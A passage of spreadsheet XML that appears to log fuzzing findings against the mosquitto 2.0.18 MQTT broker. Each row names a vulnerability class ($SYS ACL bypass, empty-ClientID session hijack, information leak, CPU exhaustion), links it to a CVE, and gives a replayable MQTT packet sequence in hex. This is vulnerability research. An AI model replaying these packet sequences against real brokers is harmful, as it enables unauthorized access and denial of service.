        <f>== 种子标识: id:000009,sev:3,cat:00c0 ===\u000a大小: 2405B (报告+请求数据)\u000a请求数据: 1898B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Excessive v5 user-properties (CPU exhaustion risk) (Cat=0x00c0 Hash=0xa8bb2df4 CVE=CVE-2021-41039)\u000a\u000a--- MQTT请求序列(1898B原始二进制) ---\u000aMsg[1]: PUBACK PacketID=4 | raw_header=4a6400040008f308f300030303030303\u000aMsg[2]: TYPE0  | raw_header=0303030303\u000aMsg[3]: TYPE0  | raw_header=0303030303\u000aMsg[4]: TYPE0  | raw_header=0303030203\u000aMsg[5]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1203030303\u000aMsg[6]: TYPE0  | raw_header=032626262626ff00034a18310100fb30\u000aMsg[7]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1203030303\u000aMsg[8]: TYPE0  | raw_header=03261d4a18310100fb304080fffb0303\u000aMsg[9]: TYPE0  | raw_header=0303030302\u000aMsg[10]: TYPE0  | raw_header=03120008f308f3000303030303030303\u000aMsg[11]: PUBACK PacketID=12545 | raw_header=4a18310100fb304080fffb0303030303\u000aMsg[12]: TYPE0  | raw_header=0303030303\u000aMsg[13]: TYPE0  | raw_header=0303030303\u000aMsg[14]: TYPE0  | raw_header=0203030303\u000aMsg[15]: TYPE0  | raw_header=031003031003ea00001d00ea5b2e4a18\u000aMsg[16]: PUBACK  | raw_header=4a00\u000aMsg[17]: TYPE0  | raw_header=08f300ea4d1d00ea221d4a18310100fb\u000aMsg[18]: TYPE0  | raw_header=0303030303\u000aMsg[19]: TYPE0  | raw_header=0303030303\u000aMsg[20]: TYPE0  | raw_header=0203120303\u000aMsg[21]: TYPE0  | raw_header=0303032626\u000aMsg[22]: CONNACK session_present=39 reason_code=27 | raw_header=2626271b000310030310030300001d00\u000aMsg[23]: AUTH  | raw_header=fb304080030303030303030303030303\u000aMsg[24]: TYPE0  | raw_header=0303030303\u000aMsg[25]: TYPE0  | raw_header=0303030303\u000a(尾部1367B): 03030203120303030303261d4a18310100fb304080fffb03030303030303030303030303030303030303030303030303fffb</f>
        <v/>
      </c>
      <c r="F3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1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71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71" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J371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371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72">
      <c r="A372" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:00c2</t>
        </is>
      </c>
      <c r="B372" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C372" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(6960B)\u000a4.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372" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:00c2 ===\u000a大小: 4927B (报告+请求数据)\u000a请求数据: 6960B\u000a\u000a---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MQTT请求序列(6960B原始二进制) ---\u000aMsg[1]: CONNACK  | raw_header=2600\u000aMsg[2]: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raw_header=26262626262626262626262626262626\u000a(尾部3299B): 2626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626</f>
        <v/>
      </c>
      <c r="F3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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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73">
      <c r="A373" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:00ca</t>
        </is>
      </c>
      <c r="B373" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C373" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D3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将种子文件(id:000009,sev:3,cat:00ca)中的REQUEST DATA提取出来(902B)\u000a4.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0x00ca\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E373" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:00ca ===\u000a大小: 3605B (报告+请求数据)\u000a请求数据: 902B\u000a\u000a---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CVE=CVE-2021-41039)\u000a\u000a--- MQTT请求序列(902B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(65521B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101500044d5154540402003cfff16166\u000aMsg[2]: SUBSCRIBE PacketID=25972 Topics=[] | raw_header=8252657461696e3d31003d00e2000a74\u000aMsg[3]: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raw_header=26262626352626262626262626262626\u000aMsg[9]: CONNACK session_present=240 reason_code=26 | raw_header=2626f01a1818150005504c41494e1600\u000aMsg[10]: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raw_header=262626262626742f000000106302fd2b\u000aMsg[20]: PUBREL PacketID=26977 | raw_header=656369616c21402324252a1800000000\u000aMsg[21]: (不完整,14B) raw=6c6ff05d182115000d0c0e110000\u000a(尾部14B): 6c6ff05d182115000d0c0e110000</f>
        <v/>
      </c>
      <c r="F3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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J37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7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74">
      <c r="A374" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B374" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C374" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D3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374" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0101 ===\u000a大小: 778B (报告+请求数据)\u000a请求数据: 267B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Empty ClientID with clean_session=0 (session hijack risk) (Cat=0x0101 Hash=0x13f826d0 CVE=CVE-2014-6116)\u000a\u000a--- MQTT请求序列(267B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQT\x00 v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=101500044d5154000000000000000000\u000aMsg[2]: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raw_header=0000\u000a(尾部196B): 000000000000000000000000000000540402003cfff661666c6e65745f633082101500044d5154540402003cfff661666c6e</f>
        <v/>
      </c>
      <c r="F3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7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74" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J37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7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75">
      <c r="A375" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:0102</t>
        </is>
      </c>
      <c r="B375" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C375" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(107B)\u000a4.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375" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0102 ===\u000a大小: 761B (报告+请求数据)\u000a请求数据: 107B\u000a\u000a---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MQTT请求序列(107B原始二进制) ---\u000aMsg[1]: (不完整,107B) raw=107f00044d515454fb7f0000000080666c6e65745f6330820100010006746573742f230034120009\u000a(尾部107B): 107f00044d515454fb7f0000000080666c6e65745f6330820100010006746573742f23003412000974656c332f6c6576656c</f>
        <v/>
      </c>
      <c r="F3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7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75" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J37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37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76">
      <c r="A376" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:0103</t>
        </is>
      </c>
      <c r="B376" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C376" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(168B)\u000a4.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376" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0103 ===\u000a大小: 841B (报告+请求数据)\u000a请求数据: 168B\u000a\u000a---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MQTT请求序列(168B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=247 Topics=[] | raw_header=826d00f72b26000a746573742f746f70\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=False payload='\x00ø\x10\x01s#î©\u0009\x00\x03æ}¶\x0bö\x90\x89pÊ\x9a:v' | raw_header=3a36001d245359532f62726f6b65722f\u000aMsg[3]: PINGRESP  | raw_header=d0</f>
        <v/>
      </c>
      <c r="F3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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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7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77">
      <c r="A377" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:010a</t>
        </is>
      </c>
      <c r="B377" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C377" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(131B)\u000a4.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377" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:010a ===\u000a大小: 2795B (报告+请求数据)\u000a请求数据: 131B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: $SYS wildcard subscription returned system data (Cat=0x000a Hash=0x3cfdd80b CVE=N/A)\u000a【Sev2】MQTT: Empty client ID (session collision risk) (Cat=0x0100 Hash=0x0bf84835 CVE=N/A)\u000a\u000a--- MQTT请求序列(131B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101500044d5154540402003c00000080\u000aMsg[2]: SUBSCRIBE PacketID=25972 Topics=[] | raw_header=8252657461696e3d31003d00e2000a74\u000aMsg[3]: TYPE0  | raw_header=0000\u000aMsg[4]: (不完整,22B) raw=f656e130d6afa085726f6f6d31002968656c6c6fe000\u000a(尾部22B): f656e130d6afa085726f6f6d31002968656c6c6fe000</f>
        <v/>
      </c>
      <c r="F3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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J37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7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78">
      <c r="A378" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:010b</t>
        </is>
      </c>
      <c r="B378" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C378" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(893B)\u000a4.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378" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:010b ===\u000a大小: 3601B (报告+请求数据)\u000a请求数据: 893B\u000a\u000a---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MQTT请求序列(893B原始二进制) ---\u000aMsg[1]: PUBCOMP PacketID=29803 | raw_header=744e746b6d14ff170231000123017374\u000aMsg[2]: TYPE0  | raw_header=0000\u000aMsg[3]: TYPE0  | raw_header=00503d00e20000000000000000000000\u000aMsg[4]: TYPE0  | raw_header=0200\u000aMsg[5]: CONNECT  | raw_header=1000\u000aMsg[6]: TYPE0  | raw_header=0052651000000d88010056656d611500\u000aMsg[7]: CONNECT Proto= v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1d0a00000000000000000000\u000aMsg[8]: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(不完整,597B) raw=0080ffff00000000000000000000000065722f74656d7015002000748252657461696e3d31006330\u000a(尾部597B): 0080ffff00000000000000000000000065722f74656d7015002000748252657461696e3d31006330823d31003d00e2000ac0</f>
        <v/>
      </c>
      <c r="F3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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J37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7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79">
      <c r="A379" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:0181</t>
        </is>
      </c>
      <c r="B379" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C379" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D3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79" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0181 ===\u000a大小: 751B (报告+请求数据)\u000a请求数据: 38B\u000a\u000a---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MQTT请求序列(38B原始二进制) ---\u000aMsg[1]: (不完整,38B) raw=35fbe8540402003c00ec61666c6265665f634698004d5154546f6f80646322726f7465e8e000\u000a(尾部38B): 35fbe8540402003c00ec61666c6265665f634698004d5154546f6f80646322726f7465e8e000</f>
        <v/>
      </c>
      <c r="F3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7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79" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J37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7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80">
      <c r="A380" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:0182</t>
        </is>
      </c>
      <c r="B380" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C380" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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380" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0182 ===\u000a大小: 1003B (报告+请求数据)\u000a请求数据: 247B\u000a\u000a---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MQTT请求序列(247B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=60s [自动清理会话] | raw_header=102200044d51545404c2003c00000009\u000aMsg[2]: SUBSCRIBE PacketID=16 Topics=['$SëS/#'(QoS=0)] | raw_header=820b001000062453eb532f2300\u000aMsg[3]: PUBLISH Topic='sensor/temp/room1' QoS=1 retain=False payload='r\x98{"temp":22.5}' | raw_header=3222001173656e736f722f74656d702f\u000aMsg[4]: PUBLISH Topic='hoc\x014#\x00\x12$SYS/' QoS=2 retain=True payload='broker' | raw_header=3515000d686f63013423001224535953\u000aMsg[5]: PUBCOMP PacketID=28788 | raw_header=7f757074696d65001b7b2274656d7022\u000aMsg[6]: (不完整,20B) raw=41204141414141414141414141414141c000e000\u000a(尾部20B): 41204141414141414141414141414141c000e000</f>
        <v/>
      </c>
      <c r="F3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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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8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1">
      <c r="A381" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:0183</t>
        </is>
      </c>
      <c r="B381" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C381" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(85B)\u000a4.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81" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0183 ===\u000a大小: 944B (报告+请求数据)\u000a请求数据: 85B\u000a\u000a---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MQTT请求序列(85B原始二进制) ---\u000aMsg[1]: PUBREC  | raw_header=590154\u000aMsg[2]: SUBSCRIBE PacketID=223 Topics=['t'(QoS=0)] | raw_header=820600df00017400\u000aMsg[3]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=True payload_len=49B | raw_header=31460013245359532f62726f6b65722f\u000aMsg[4]: (不完整,2B) raw=fe74\u000a(尾部2B): fe74</f>
        <v/>
      </c>
      <c r="F3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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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2">
      <c r="A382" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:01c1</t>
        </is>
      </c>
      <c r="B382" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C382" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D3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382" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:01c1 ===\u000a大小: 877B (报告+请求数据)\u000a请求数据: 159B\u000a\u000a---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MQTT请求序列(159B原始二进制) ---\u000aMsg[1]: PUBACK PacketID=9766 | raw_header=4b26262626262689ff26262626262626\u000aMsg[2]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626268026262626\u000aMsg[3]: (不完整,79B) raw=706963000b77696c6c5f76355f6d73677612001e000d806f6d652f2b2f737461747552022b2f7374\u000a(尾部79B): 706963000b77696c6c5f76355f6d73677612001e000d806f6d652f2b2f737461747552022b2f73746174755202301b001464</f>
        <v/>
      </c>
      <c r="F3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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J38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8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83">
      <c r="A383" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B383" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C383" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(31690B)\u000a4.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383" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0206 ===\u000a大小: 4722B (报告+请求数据)\u000a请求数据: 31690B\u000a\u000a---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MQTT请求序列(31690B原始二进制) ---\u000aMsg[1]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=10157f044d515454040200ffff7fff66\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=['t+stMQ'(QoS=0)] | raw_header=820b00010006742b73744d5154\u000aMsg[3]: PUBREC  | raw_header=5400\u000aMsg[4]: TYPE0  | raw_header=0200\u000aMsg[5]: (不完整,4230B) raw=3cfff601666c6e65745f6330820b00010006746573742f23003412001500044d5154540402153cff\u000a(尾部4230B): 3cfff601666c6e65745f6330820b00010006746573742f23003412001500044d5154540402153cfff661666c2f62726f6b65</f>
        <v/>
      </c>
      <c r="F3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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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8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4">
      <c r="A384" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:020e</t>
        </is>
      </c>
      <c r="B384" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C384" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(118B)\u000a4.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384" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:020e ===\u000a大小: 2793B (报告+请求数据)\u000a请求数据: 118B\u000a\u000a---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MQTT请求序列(118B原始二进制) ---\u000aMsg[1]: PUBREL PacketID=4 | raw_header=601500044d5154540402003c00096166\u000aMsg[2]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3252657461696e3d31003d00e2000a74\u000aMsg[3]: AUTH  | raw_header=f000\u000aMsg[4]: (不完整,9B) raw=6450267788ad53e000\u000a(尾部9B): 6450267788ad53e000</f>
        <v/>
      </c>
      <c r="F3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8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84" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J38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85">
      <c r="A385" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:0286</t>
        </is>
      </c>
      <c r="B385" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C385" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(166B)\u000a4.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385" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0286 ===\u000a大小: 1140B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MQTT请求序列(166B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(65526B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101500044d5154540402003cfff66166\u000aMsg[2]: SUBSCRIBE PacketID=1025 Topics=['test/#'(QoS=0)] | raw_header=820b04010006746573742f2300\u000aMsg[3]: PUBLISH Topic='test/data' QoS=2 retain=False payload='\x00\x02hello' | raw_header=34120009746573742f64617461000268\u000aMsg[4]: PUBREC PacketID=2 | raw_header=50020002\u000aMsg[5]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=True payload_len=53B | raw_header=314a0013245359532f62726f6b65722f\u000aMsg[6]: PUBREL PacketID=2 | raw_header=62020002\u000aMsg[7]: (不完整,26B) raw=70e0007a157f226a05ffff05fffa1d2f742f746f706963020001\u000a(尾部26B): 70e0007a157f226a05ffff05fffa1d2f742f746f706963020001</f>
        <v/>
      </c>
      <c r="F3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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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8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6">
      <c r="A386" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:028e</t>
        </is>
      </c>
      <c r="B386" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C386" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(209B)\u000a4.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0x028e\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E386" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:028e ===\u000a大小: 3258B (报告+请求数据)\u000a请求数据: 209B\u000a\u000a---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MQTT请求序列(209B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID='aClnet_\x82a'(9B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101500044d5154540402003c00096143\u000aMsg[2]: TYPE0  | raw_header=0025002b766572792f646565702f746f\u000aMsg[3]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=332f6c6576656c3401000000002b7665\u000aMsg[4]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=332f6c6576656c3400323b000a746573\u000aMsg[5]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=192f091f9489ccd4e9c502591177f86c</f>
        <v/>
      </c>
      <c r="F3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8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86" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J38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8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87">
      <c r="A387" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:02c4</t>
        </is>
      </c>
      <c r="B387" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C387" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(565B)\u000a4.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387" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:02c4 ===\u000a大小: 1329B (报告+请求数据)\u000a请求数据: 565B\u000a\u000a---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MQTT请求序列(565B原始二进制) ---\u000aMsg[1]: CONNECT Proto=\x02\x00&lt;\x00 v0 ClientID=''(17219B) clean_session=False keepalive=256s [持久会话] | raw_header=1015000402003c000000010043434343\u000aMsg[2]: PUBACK PacketID=10307 | raw_header=43432843434343436c6c6ff00a181f15\u000aMsg[3]: PUBCOMP PacketID=2 | raw_header=7461000287676c4f6f6e65745f633082\u000aMsg[4]: CONNECT  | raw_header=1000\u000aMsg[5]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[6]: TYPE0  | raw_header=000100\u000aMsg[7]: TYPE0  | raw_header=06746573742f23003226262626262626\u000aMsg[8]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[9]: PUBREL PacketID=10601 | raw_header=69692969696969696969696969696069\u000aMsg[10]: CONNECT Proto=SCR9M-SHÁÅ256 v22 ClientID=''(0B) clean_session=False keepalive=3681s [持久会话] | raw_header=1f15000d534352394d2d5348c1c53235\u000aMsg[11]: (不完整,41B) raw=685f646174615f66820b00010006746573742f23001e120009746573a42fffff0000000287676c6c\u000a(尾部41B): 685f646174615f66820b00010006746573742f23001e120009746573a42fffff0000000287676c6c6f</f>
        <v/>
      </c>
      <c r="F3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8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87" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J38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38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88">
      <c r="A388" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:02c6</t>
        </is>
      </c>
      <c r="B388" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C388" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(1029B)\u000a4.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388" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:02c6 ===\u000a大小: 4659B (报告+请求数据)\u000a请求数据: 1029B\u000a\u000a---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CVE=N/A)\u000a\u000a--- MQTT请求序列(1029B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0563e90100515454040402003c000961\u000aMsg[2]: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raw_header=2626262624263c262626262626262626\u000aMsg[7]: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raw_header=2626262600ff26262626262626262626\u000aMsg[11]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[12]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[13]: CONNACK session_present=148 reason_code=38 | raw_header=2626942626262626262626262626ff7f\u000aMsg[14]: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raw_header=26262626262613262626262626262626\u000aMsg[22]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262624262626\u000aMsg[23]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[24]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[25]: (不完整,8B) raw=26262626922be1b2\u000a(尾部8B): 26262626922be1b2</f>
        <v/>
      </c>
      <c r="F3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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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8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89">
      <c r="A389" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:0305</t>
        </is>
      </c>
      <c r="B389" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C389" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D3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389" s="2">
